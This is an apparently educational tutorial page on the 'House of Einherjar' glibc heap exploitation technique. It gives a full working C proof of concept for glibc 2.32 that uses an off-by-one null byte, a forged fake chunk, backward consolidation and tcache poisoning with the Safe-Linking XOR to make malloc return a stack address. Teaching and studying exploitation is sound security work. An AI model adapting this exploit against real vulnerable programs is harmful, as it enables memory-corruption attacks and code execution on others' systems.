#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "House of Einherjar",
    description: "Abusing an off-by-one null byte to clear the PREV_INUSE bit and trigger backward consolidation with a forged fake chunk.",
    date: "2025-12-26",
    order: 42,
  ),
)<frontmatter>

= glibc Allocator: House of Einherjar

== Introduction

The "House of Einherjar" is a sophisticated heap exploitation technique that leverages an off-by-one null byte vulnerability. By writing a single null byte into the `size` field of the next chunk, an attacker can clear the `PREV_INUSE` bit. This tricks the allocator into believing that the previous chunk is free, even if it is not.

== Prerequisites
- *Off-by-one Null Byte*: Ability to write a single null byte past a buffer, clearing the `PREV_INUSE` bit of the next chunk.
- *Forged Metadata*: Ability to write a fake `prev_size` field in the user data of the preceding chunk.
- *Known Heap Address*: Needed to forge a fake chunk inside the preceding chunk that passes the `unlink` check (`P->fd->bk == P` and `P->bk->fd == P`).
- *T-cache Exhaustion*: On modern glibc, the t-cache for the target size must be full to trigger backward consolidation during `free()`.

== Example Code


This PoC demonstrates the attack on glibc 2.32, using a null-byte overflow to trigger consolidation with a fake chunk on the heap, followed by tcache poisoning to gain control over a stack address.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <malloc.h>
#include <assert.h>

int main()
{
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	intptr_t stack_var[0x10];
	intptr_t *target = NULL;
	for(int i=0; i<0x10; i++) {
		if(((long)&stack_var[i] & 0xf) == 0) {
			target = &stack_var[i];
			break;
		}
	}
	assert(target != NULL);

	intptr_t *a = malloc(0x38);

	// Forge fake chunk
	a[0] = 0;               
	a[1] = 0x60;            
	a[2] = (size_t) a;  
	a[3] = (size_t) a;  

	uint8_t *b = (uint8_t *) malloc(0x28);
	int real_b_size = malloc_usable_size(b);
	uint8_t *c = (uint8_t *) malloc(0xf8);

	// VULNERABILITY: Off-by-one null byte
	b[real_b_size] = 0;

	// Forge prev_size
	size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a);
	*(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size;
	a[1] = fake_size;

	// Fill tcache
	intptr_t *x[7];
	for(int i=0; i<7; i++) x[i] = malloc(0xf8);
	for(int i=0; i<7; i++) free(x[i]);

	// Trigger backward consolidation
	free(c);

	intptr_t *d = malloc(0x158);

	uint8_t *pad = malloc(0x28);
	free(pad);
	free(b);

	// VULNERABILITY: Tcache Poisoning (overlapping chunk)
	d[0x30 / 8] = (long)target ^ ((long)&d[0x30/8] >> 12);

	malloc(0x28);
	intptr_t *e = malloc(0x28);

	assert(e == target);
	return 0;
}
```

== Attack Flow Explained

=== 1. Forging the Fake Chunk

The allocator performs an `unlink` operation on the "previous" chunk during backward consolidation. To pass modern `unlink` checks, the attacker must ensure that `P->fd->bk == P` and `P->bk->fd == P`. In the PoC, this is achieved by pointing the fake chunk's `fd` and `bk` back to its own address.

=== 2. The Off-By-One Null Byte

By writing a null byte into the `size` field of chunk `c`, we clear the `PREV_INUSE` bit. This is the core primitive. Because chunk sizes are typically multiples of `0x10` or `0x8`, the least significant byte is often `0x00` or `0x01`. Overwriting `0x101` with `0x00` effectively turns it into `0x100`.

=== 3. Forging `prev_size`

When `c` is freed, the allocator sees `PREV_INUSE == 0` and looks at the `prev_size` field (which is the last 8 bytes of chunk `b`'s user data) to find the start of the previous chunk. We forge this value such that `c - prev_size` points exactly to our fake chunk `a`.

=== 4. Consolidation

Upon `free(c)`, the allocator:
1. Calculates `target = c - forged_prev_size` (which is `a`).
2. Performs `unlink(a)` (which passes because of our setup in Step 1).
3. Creates a new massive chunk starting at `a` and ending at `c + size(c)`.

=== 5. Overlapping and Control

Because the new large chunk overlaps with the still-allocated chunk `b`, an attacker can request the large chunk back (`d = malloc(...)`) and then use the overlap to overwrite `b`'s metadata. In the PoC, this is used to perform **tcache poisoning**, pointing `b->next` to a stack address, allowing a subsequent `malloc` to return a pointer to the stack.

== Modern Mitigations

Since glibc 2.32, **Safe-Linking** was introduced. Pointers in tcache and fastbins are now XORed with their own address (shifted 12 bits) to prevent simple overwrites. Exploiting this now requires a heap leak to correctly calculate the encoded pointer value, as demonstrated in the PoC:
`d[0x30 / 8] = (long)target ^ ((long)&d[0x30/8] >> 12);`
